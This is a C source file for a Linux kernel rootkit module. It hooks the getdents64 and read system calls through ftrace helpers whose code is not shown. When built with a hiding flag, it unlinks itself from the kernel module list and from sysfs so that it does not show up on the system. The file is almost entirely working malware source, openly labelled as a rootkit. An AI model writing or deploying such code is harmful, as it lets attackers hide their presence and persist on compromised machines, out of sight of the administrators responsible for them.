
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kobject.h>

#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_getdents.h"
#include "hooks/x64_sys_read.h"

// define which functions to hook
static struct ftrace_hook hooks[] = {
        HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
        HOOK("__x64_sys_read", hook_read, &orig_read),
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

#ifdef HIDE_MODULE
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif

    return 0;
}


// cleanup: restore original syscall pointer
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
